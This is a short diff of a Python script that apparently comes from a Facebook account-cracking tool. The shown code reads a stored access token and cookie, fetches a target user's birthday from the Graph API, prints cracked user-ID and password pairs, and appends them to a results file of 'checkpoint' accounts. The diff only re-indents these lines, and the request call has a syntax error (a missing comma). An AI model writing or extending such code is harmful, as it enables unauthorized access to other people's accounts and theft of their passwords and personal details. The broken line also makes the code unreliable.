@@ -959,13 +959,13 @@ def api(uid, fii):
             try:
               token  = open('login/token.json','r').read()
               cookie = {'cookie':open('login/cookie.json','r').read()}
-                ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)cookies=cookie).json()["birthday"]
-                month, day, year = ttl.split("/")
-                month = _bulan_[month]
-                print(f"\r{B} |----> {K}{uid}•{pw}•{day} {month} {year}")
-                cp.append("%s|%s"%(uid, pw))
-                open("CP/%s.json"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
-                break
+              ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)cookies=cookie).json()["birthday"]
+              month, day, year = ttl.split("/")
+              month = _bulan_[month]
+              print(f"\r{B} |----> {K}{uid}•{pw}•{day} {month} {year}")
+              cp.append("%s|%s"%(uid, pw))
+              open("CP/%s.json"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
+              break
             except (KeyError, IOError):
                 day = (" ")
                 month = (" ")
